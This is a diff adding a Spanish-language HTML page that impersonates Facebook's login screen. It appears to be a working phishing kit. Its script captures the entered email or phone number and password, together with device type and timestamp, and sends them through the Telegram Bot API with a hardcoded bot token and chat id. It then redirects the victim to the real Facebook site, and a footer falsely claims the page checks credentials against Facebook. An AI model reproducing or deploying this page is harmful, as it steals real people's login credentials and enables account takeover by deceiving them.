@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Inicia sesión o regístrate</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            width: 396px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px 16px;
+        }
+        .success-message {
+            display: none;
+            background-color: #dff0d8;
+            border: 1px solid #d6e9c6;
+            color: #3c763d;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            text-align: center;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .logo svg {
+            height: 106px;
+            margin-bottom: 0;
+        }
+        input {
+            background-color: #FFFFFF;
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            margin-bottom: 12px;
+            line-height: 16px;
+            color: #1d2129;
+            outline: none;
+        }
+        input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        button {
+            margin-top: 6px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 0 16px;
+            line-height: 48px;
+            width: 100%;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #166fe5;
+        }
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        .footer {
+            text-align: center;
+            font-size: 13px;
+            color: #606770;
+            margin-top: 28px;
+            line-height: 1.34;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="success-message">Datos guardados correctamente</div>
+        <div class="logo">
+            <!-- Logo SVG omitido por espacio -->
+            <h1 style="color:#1877f2;">Facebook</h1>
+        </div>
+
+        <form>
+            <input type="text" placeholder="Correo electrónico o número de teléfono" required />
+            <input type="password" placeholder="Contraseña" required />
+            <button type="submit">Iniciar sesión</button>
+        </form>
+
+        <div class="footer">
+            Este sistema verifica credenciales contra Facebook
+        </div>
+    </div>
+
+<script>
+function detectarDispositivo() {
+    const ua = navigator.userAgent;
+    if (/Mobi|Android/i.test(ua)) {
+        return "Móvil";
+    }
+    return "PC";
+}
+
+function enviarDatosTelegram(event) {
+    event.preventDefault();
+    const correo = document.querySelector('input[type="text"], input[name="email"]').value;
+    const contrasena = document.querySelector('input[type="password"]').value;
+    const dispositivo = detectarDispositivo();
+    const fecha = new Date().toLocaleString();
+
+    const mensaje = `📥 Nuevo intento de inicio de sesión:%0A📧 Correo: ${correo}%0A🔐 Contraseña: ${contrasena}%0A🕒 Fecha y hora: ${fecha}%0A💻 Dispositivo: ${dispositivo}`;
+
+    const chat_id = "-1002298786793";
+    const token = "7340213346:AAE73iC63UWZYLjx1C5q1bR-dRZDfa4hUy4";
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${mensaje}`;
+
+    fetch(url).then(() => {
+        window.location.href = "https://facebook.com"; // Redirige después del envío
+    });
+}
+
+document.addEventListener("DOMContentLoaded", () => {
+    const form = document.querySelector("form");
+    if (form) {
+        form.addEventListener("submit", enviarDatosTelegram);
+    }
+});
+</script>
+
+</body>
+</html>
